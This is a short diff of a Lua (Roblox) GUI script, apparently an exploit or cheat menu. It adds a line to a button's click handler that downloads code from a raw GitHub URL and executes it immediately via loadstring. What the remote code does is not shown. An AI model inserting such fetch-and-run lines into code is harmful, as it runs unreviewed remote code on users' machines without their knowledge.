@@ -137,6 +137,8 @@ for i, tabName in ipairs(tabs) do
         
         button1.MouseButton1Click:Connect(function()
             print("Скрипт активирован")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/F/refs/heads/main/F", true))()
+
 end)
         
         -- Кнопка 2
